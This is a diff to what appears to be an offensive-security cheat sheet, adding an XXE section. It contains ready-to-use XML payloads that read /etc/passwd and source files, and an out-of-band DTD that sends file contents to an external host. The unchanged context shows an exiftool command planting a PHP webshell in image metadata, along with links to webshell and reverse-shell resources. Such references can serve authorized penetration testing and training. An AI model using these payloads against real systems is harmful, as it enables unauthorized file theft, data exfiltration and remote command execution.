@@ -26,6 +26,7 @@
     - [LFI](#lfi)
   - [Webshell](#webshell)
   - [File Upload](#file-upload)
+    - [XXE](#xxe)
   - [Reverse Shell](#reverse-shell)
     - [Bypass](#bypass)
   - [SQLi](#sqli)
@@ -367,6 +368,32 @@ exiftool -Comment='<?php echo "START\n"; echo(exec($_GET["cmd"])); echo "\nEND";
 ```
 Wordpress <br/>
 https://github.com/p0dalirius/Wordpress-webshell-plugin
+### XXE
+```xml
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+<data>&example;</data>
+```
+#### DTD
+malicious.dtd
+```xml:malicious.dtd
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.1/?x=%file;'>">
+%eval;
+%exfil;
+```
+payload
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
+```
+
+#### SVG Image
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+<svg>&xxe;</svg>
+```
 ## Reverse Shell
 https://www.revshells.com/
 <br/>
